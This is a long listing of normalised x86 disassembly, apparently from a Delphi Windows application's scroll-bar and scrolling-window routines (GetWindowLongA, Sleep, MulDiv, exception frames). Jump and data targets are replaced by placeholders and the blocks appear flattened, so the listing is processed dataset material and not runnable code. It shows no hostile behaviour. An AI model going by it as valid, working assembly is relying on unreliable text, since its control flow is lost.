pop esi
pop ebx
retn
sub_45fbe8
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44f2dc
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_45fc1c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_45fbe8
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_45fbe8
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_45fc98
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44f2dc
push eax
call GetWindowLongA
test eax r--data
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_45fc1c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4484f8
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_45fc1c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44853c
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45fd30
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44f2dc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_45fd90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_45ff61 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45fc98
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45fc98
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_460100
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
push ebp
call sub_45fd30
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
push ebp
call sub_45fd30
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406af4
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_460100
jmp r-xdata
sub_460088
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_460778
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_460100
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_44f2dc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_44f2dc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_44ee94
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_44ee94
jmp r-xdata
call sub_45f870
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4601c4
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_460778
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_46027c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f2dc
push eax
call sub_42b058
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f2dc
push eax
call sub_42b058
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f2dc
push eax
call sub_42b058
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_4232e0
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f2dc
push eax
call sub_42b058
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f2dc
push eax
call sub_42b058
sub_460384
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_45fc98
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_45fc98
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_46027c
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f2dc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_460100
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_45fc98
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_46049c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b008
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f918
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f918
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_460514
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403290
mov eax [ esi + 0x20c ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b12c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_460560
push ebx
mov ebx eax
mov eax ebx
call sub_44c294
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_460778
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bfc0
test al al
jne r-xdata
mov eax ebx
call sub_44f2dc
push eax
call sub_42b08c
sub_4605a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4606f8
mov ecx edi
mov edx esi
mov eax ebx
call sub_44b9dc
pop edi
pop esi
pop ebx
retn
sub_4605e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4606e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4484f8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_45fbb0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_44c00c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_460100
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44bfd0
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44bfd0
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_4181b4
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_448264
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4606ef
mov eax [ ebp - 0x10 ]
call sub_403290
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45f9f8
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_418310
xor ecx ecx
mov edx 0xb03e
call sub_449ca8
inc ebx
dec esi
jne r-xdata
sub_46071c
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_460250
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_460250
mov eax ebx
call sub_4606f8
jmp r-xdata
sub_460778
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44f5e0
test al al
je r-xdata
xor eax eax
push ebp
push sub_460863
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_45fd18
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45fd18
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_460384
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_460384
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_460384
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_460384
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_460384
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_460384
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_460888
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_44860c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_448638
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_44860c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_448638
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4484f8
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_460100
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4484f8
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_44853c
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_460100
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_4484f8
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_460100
mov eax ebx
call sub_4484f8
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_44853c
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_44853c
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_460100
mov eax ebx
call sub_44853c
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_4609dc
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_460100
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_460100
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_460250
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_460250
sub_460a80
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4609dc
mov ecx edi
mov edx esi
mov eax ebx
call sub_44ede8
pop edi
pop esi
pop ebx
retn
sub_460aa8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_460b12
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d8c8
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460b19
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_460b19
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_460b51
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4606f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460b58
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_460b58
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_460778
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_460bcc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44853c
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_4292a8
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_4484f8
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_4292a8
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_416cfc
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_44b348
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_460c3c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_460c9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40341c
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44e658
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460ca4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_460ccc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_460e30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_460e10
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4031d8
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_4035dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460e17
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_460dd8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_417f44
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
